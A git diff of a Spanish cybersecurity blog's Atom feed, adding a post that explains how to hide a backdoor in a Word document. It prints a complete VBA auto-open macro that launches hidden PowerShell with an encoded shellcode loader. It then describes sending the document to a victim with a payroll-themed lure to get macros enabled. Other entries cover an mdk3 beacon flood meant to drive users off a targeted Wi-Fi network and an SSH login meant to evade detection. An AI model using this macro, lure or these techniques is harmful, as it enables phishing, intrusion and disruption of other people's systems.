@@ -1,8 +1,8 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-05-27T01:07:31+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">shakar | Blog de ciberseguridad</title><subtitle>Blog personal sobre ciberseguridad y otros</subtitle><author><name>shakarr</name></author><entry><title type="html">Creando 1000+ hostposts</title><link href="http://localhost:4000/creando-1000-hostpost/" rel="alternate" type="text/html" title="Creando 1000+ hostposts" /><published>2021-05-26T00:00:00+02:00</published><updated>2021-05-26T00:00:00+02:00</updated><id>http://localhost:4000/creando-1000-hostpost</id><content type="html" xml:base="http://localhost:4000/creando-1000-hostpost/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-08-20T18:25:50+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">shakar | Blog de ciberseguridad</title><subtitle>Blog personal sobre ciberseguridad y otros</subtitle><author><name>shakarr</name></author><entry><title type="html">Creando 1000+ hotsposts</title><link href="http://localhost:4000/creando-1000-hostpost/" rel="alternate" type="text/html" title="Creando 1000+ hotsposts" /><published>2021-05-26T00:00:00+01:00</published><updated>2021-05-26T00:00:00+01:00</updated><id>http://localhost:4000/creando-1000-hostpost</id><content type="html" xml:base="http://localhost:4000/creando-1000-hostpost/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/creando-1000-hostpost/mdk-feature.jpg&quot; width=&quot;50%&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;En este post vamos a tratar uno de los muchos metodos de como crear un hostpost, para esta prueba utilizaremos &lt;strong&gt;mdk3&lt;/strong&gt; y lo que haremos será un ataque &lt;strong&gt;BEACOON FLOOD&lt;/strong&gt; donde lo que tendrá por objetivo es crear un montón de puntos de acceso con el mismo nombre &lt;strong&gt;ESSID&lt;/strong&gt; que la red a la que queramos dañar pero con distinta &lt;strong&gt;MAC&lt;/strong&gt; con esto conseguirmos o bien echar a los usuarios de la red o hacer que la conexión vaya un peor.&lt;/p&gt;
+&lt;p&gt;En este post vamos a tratar uno de los muchos metodos de como crear un hotspost, para esta prueba utilizaremos &lt;strong&gt;mdk3&lt;/strong&gt; y lo que haremos será un ataque &lt;strong&gt;BEACOON FLOOD&lt;/strong&gt; donde lo que tendrá por objetivo es crear un montón de puntos de acceso con el mismo nombre &lt;strong&gt;ESSID&lt;/strong&gt; que la red a la que queramos dañar pero con distinta &lt;strong&gt;MAC&lt;/strong&gt; con esto conseguirmos o bien echar a los usuarios de la red o hacer que la conexión vaya un peor.&lt;/p&gt;
 
 &lt;p&gt;Una cosa que podemos hacer con esta herramienta es crear puntos de acceso con nombres personalizados, en nuestro caso vamos a crear alrededor de 1000 puntos de acceso con un fichero el cuál generará un ESSID ‘Wifi_Gratis’ seguido de un número al final que se irá incrementando, bien manos a la obra.&lt;/p&gt;
 
@@ -21,7 +21,7 @@ done
 &lt;p&gt;Sencillo cierto, solo estamos haciendo un buclee que cree los 1000 puntos de acceso, les asigna el número, lo incrementa y los va guardando en un fichero llamado &lt;strong&gt;redes.txt&lt;/strong&gt; que será el que usaremos con mdk3.&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;NOTA: Acuerdate de cuardarlo con extension .sh&lt;/p&gt;
+  &lt;p&gt;NOTA: Acuerdate de guardarlo con extension .sh&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;Si quereis podeis hacer un cat depués de haberlo ejecutado el .sh &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./nombrefichero.sh&lt;/code&gt;(por si no te acuerdas) y os debería de salir algo como esto&lt;/p&gt;
@@ -40,7 +40,83 @@ done
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/creando-1000-hostpost/imag2.png&quot; width=&quot;50%&quot; /&gt;
-&lt;/p&gt;</content><author><name>shakarr</name></author><category term="Explicaciones" /><category term="Tutoriales" /><category term="Redes" /><category term="Ataques" /><category term="mdk3" /><category term="hacking" /><summary type="html">En este post te explico brevemente un ataque muy comun con mdk3 en el cual crearemos alrededor de 1000 puntos de acceso</summary></entry><entry><title type="html">Conectarse a otro pc por tunelación SSH</title><link href="http://localhost:4000/tunel-ssh/" rel="alternate" type="text/html" title="Conectarse a otro pc por tunelación SSH" /><published>2021-05-25T00:00:00+02:00</published><updated>2021-05-25T00:00:00+02:00</updated><id>http://localhost:4000/tunel-ssh</id><content type="html" xml:base="http://localhost:4000/tunel-ssh/">&lt;p align=&quot;center&quot;&gt;
+&lt;/p&gt;</content><author><name>shakarr</name></author><category term="Explicaciones" /><category term="Tutoriales" /><category term="Redes" /><category term="Ataques" /><category term="mdk3" /><category term="hacking" /><summary type="html">En este post te explico brevemente un ataque muy comun con mdk3 en el cual crearemos alrededor de 1000 puntos de acceso</summary></entry><entry><title type="html">Como esconder un backdoor en un documento</title><link href="http://localhost:4000/esconder-backdoor-en-documento/" rel="alternate" type="text/html" title="Como esconder un backdoor en un documento" /><published>2021-05-26T00:00:00+01:00</published><updated>2021-05-26T00:00:00+01:00</updated><id>http://localhost:4000/esconder-backdoor-en-documento</id><content type="html" xml:base="http://localhost:4000/esconder-backdoor-en-documento/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/esconder-backdoor-en-documento/man_in_doorway_newblog.png&quot; width=&quot;50%&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;En este post vamos a tratar un sencillo metodo de intrusión el cual consiste en esconde un backdoor en un documento, como puede ser word, pdf,…etc.&lt;/p&gt;
+
+&lt;p&gt;Primero vamos a necesitar una herramienta externa desde los repositorios de github, la cual es ps1encode: &lt;strong&gt;https://github.com/CroweCybersecurity/ps1encode&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/CroweCybersecurity/ps1encode.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/esconder-backdoor-en-documento/img1.png&quot; width=&quot;100%&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Al ejecutarlo vemos que nos muestra el modo de uso, el cual es bien sencillo, solo tenemos que pasarle los parametros necesarios, y como trabajamos con una conexión TCP debemos de pasarle el puerto y la IP origen.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;NOTA: si quieres trabajar fuera de red local acuerdate de que tienes que abrir un puerto para tu ip pública&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;En mi caso será dentro de red local por lo que no será necesario que abra ningún puerto. La configuración quedaría tal que así:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/esconder-backdoor-en-documento/img2.png&quot; width=&quot;100%&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Vemos que en la opción &lt;strong&gt;-t&lt;/strong&gt; usaremos el encode de &lt;strong&gt;vba&lt;/strong&gt;, en otra palabras visual basic for application, que como ya sabemos es el lenguaje de macros de microsoft que se usa para programar aplicaciones windows. En cuanto presionemos enter nos saldrá un rollo como este:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sub Auto_Open()
+
+stringA = &quot;power&quot;
+stringB = &quot;shell.exe -NoE -NoP -NonI -W Hidden -E &quot;
+            
+string0=&quot;JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAH&quot;
+string1=&quot;MAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBj&quot;
+string2=&quot;ACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALA&quot;
+string3=&quot;AgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMA&quot;
+string4=&quot;dABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG&quot;
+string5=&quot;4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAcwBjACAAPQAgADsAJABzAGkAegBlACAAPQAgADAAeAAxADAAMAAwADsAaQBm&quot;
+string6=&quot;ACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABzAGkAegBlACAAPQAgACQAcwBjAC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAHMAaQB6AGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMA&quot;
+string7=&quot;A7ACQAaQAgAC0AbABlACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAHcAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJAB4AC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAGkAKQAsACAAJABzAGMAWwAkAGkAXQAsACAAMQApAH0AOwAkAHcAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUA&quot;
+string8=&quot;YQBkACgAMAAsADAALAAkAHgALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ADsAKQB7AFMAdABhAHIAdAAtAHMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAZwBxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC&quot;
+string9=&quot;4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAHgAOAA2ACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABX&quot;
+string10=&quot;AGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABjAG0AZAAgAD0AIAAiAC0AbgBvAHAAIAAtAG4AbwBuAGkAIAAtAGUAbgBjACAAIgA7AGkAZQB4ACAAIgAmACAAJAB4ADgANgAgACQAYwBtAGQAIAAkAGcAcQAiAH0AZQBsAHMAZQB7ACQAYwBtAGQAIAA9ACAAIg&quot;
+string11=&quot;AtAG4AbwBwACAALQBuAG8AbgBpACAALQBlAG4AYwAiADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABjAG0AZAAgACQAZwBxACIAOwB9AA==&quot;
+
+stringFinal=stringA+stringB+string0+string1+string2+string3+string4+string5+string6+string7+string8+string9+string10+string11
+
+    Shell stringFinal, 0
+End Sub
+
+Sub AutoOpen()
+        Auto_Open
+End Sub
+Sub Workbook_Open()
+        Auto_Open
+End Sub
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El cual tenemos que copiar explicitamente.&lt;/p&gt;
+
+&lt;p&gt;Bien ahora tendremos que abrir un documento word, en el cual vamos a tener que habilitar la herramienta de desarrollador, nos dirigimos a &lt;strong&gt;archivo &amp;gt; opciones &amp;gt; personalizar cinta de opciones&lt;/strong&gt; y seleccionamos desarrollador para que sea visible.&lt;/p&gt;
+
+&lt;p&gt;Una vez que ya hemos realizado el paso anterior pinchamos en desarrollador, nos vamos a visual basic(se encuantra en la barra de herramientas superior) y pinchamos en “this document” y se nos abrirá una ventana nueva. Esta ventana tiene dos apartados, en el primero de ellos por defecto estará en general, tenemos que cambiarlo a document, y luego cambiaremos, a su derecha, la opcion a “open”.&lt;/p&gt;
+
+&lt;p&gt;Ahora es importante eliminar todo lo que por defecto se haya escrito en la parte de debajo, borramos y pegamos lo que nos generó el ps1encode.&lt;/p&gt;
+
+&lt;p&gt;Bueno pues echo esto ya puedes cerrar la ventana de visual basic, de vuelta en el documento word escribe lo que queiras, un proyecto, un trabajo etc…
+Cuando termines es importante que lo guardes con extensión .doc, ya que esta corresponde a word 97-2003.&lt;/p&gt;
+
+&lt;p&gt;Ya solo resta enviarlo a la víctima. Un pequeño detalle la víctima verá lo que haya en el word como si fuera un archivo corriente, pero leugo se le abrirá arriba un diálogo amarillo con lo siguiente &lt;strong&gt;“Haz click en habilitar macros para ver el contenido”&lt;/strong&gt; con el boton correspondiente alado, aqui es donde entran tus dotes de ethical hacking ya que tendras que hacer que el emnsaje que hayas escrito en el word concuerde para qu eneustra víctima no sospeche cuando le salga el mensaje, una ejemplo en empresa podría ser el siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;“Buenas tardes, aqui les adjunto los informes correspondientes a las nóminas de la semana pasada”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Viendo este mensaje más el que le sale mencionado anteriormente la víctima creera que tendrá que activar dicha opción para visualizar el contenido, ya esto queda a vuestra manera el como hacerlo.&lt;/p&gt;</content><author><name>shakarr</name></author><category term="Intrusion" /><category term="Tutoriales" /><category term="Backdoor" /><category term="Ataques" /><category term="hacking" /><summary type="html">En este post te explico un metodo de intrusion, que consiste en esconder un backdoor en un documento</summary></entry><entry><title type="html">Conectarse a otro pc por tunelación SSH</title><link href="http://localhost:4000/tunel-ssh/" rel="alternate" type="text/html" title="Conectarse a otro pc por tunelación SSH" /><published>2021-05-25T00:00:00+01:00</published><updated>2021-05-25T00:00:00+01:00</updated><id>http://localhost:4000/tunel-ssh</id><content type="html" xml:base="http://localhost:4000/tunel-ssh/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/tunel-ssh/ssh-banner.jpeg&quot; width=&quot;50%&quot; /&gt;
 &lt;/p&gt;
 
@@ -96,7 +172,7 @@ También tendras que tenerlo instalado en tu maquina, ya que mediante la instala
 
 &lt;h1 id=&quot;puedo-entrar-de-manera-invisible&quot;&gt;¿Puedo entrar de manera invisible?&lt;/h1&gt;
 
-&lt;p&gt;Claro que sí, así a la hora de realizar un escaneo no se detectará que hay alguien más en sus sistema. Esto lo podemos hacer de la siguiente manera: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -t USER@HOST /bin/bash -I&lt;/code&gt;&lt;/p&gt;</content><author><name>shakarr</name></author><category term="Explicaciones" /><category term="Tutoriales" /><category term="Túneles" /><category term="SSH" /><summary type="html">En este post te explico brevemente como conectarte a otra maquina dentro de tu red vía túnel SSH y algunas cosas que puedes hacer en el ordenador objetivo</summary></entry><entry><title type="html">Explicando el modelo OSI y TCP/IP</title><link href="http://localhost:4000/explicando-el-modelo-osi/" rel="alternate" type="text/html" title="Explicando el modelo OSI y TCP/IP" /><published>2021-05-23T00:00:00+02:00</published><updated>2021-05-23T00:00:00+02:00</updated><id>http://localhost:4000/explicando-el-modelo-osi</id><content type="html" xml:base="http://localhost:4000/explicando-el-modelo-osi/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;Claro que sí, así a la hora de realizar un escaneo no se detectará que hay alguien más en sus sistema. Esto lo podemos hacer de la siguiente manera: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -t USER@HOST /bin/bash -I&lt;/code&gt;&lt;/p&gt;</content><author><name>shakarr</name></author><category term="Explicaciones" /><category term="Tutoriales" /><category term="Túneles" /><category term="SSH" /><summary type="html">En este post te explico brevemente como conectarte a otra maquina dentro de tu red vía túnel SSH y algunas cosas que puedes hacer en el ordenador objetivo</summary></entry><entry><title type="html">Explicando el modelo OSI y TCP/IP</title><link href="http://localhost:4000/explicando-el-modelo-osi/" rel="alternate" type="text/html" title="Explicando el modelo OSI y TCP/IP" /><published>2021-05-23T00:00:00+01:00</published><updated>2021-05-23T00:00:00+01:00</updated><id>http://localhost:4000/explicando-el-modelo-osi</id><content type="html" xml:base="http://localhost:4000/explicando-el-modelo-osi/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/explicacion-del-modelo-osi/osi-image-1.jpg&quot; width=&quot;50%&quot; /&gt;
 &lt;/p&gt;
 
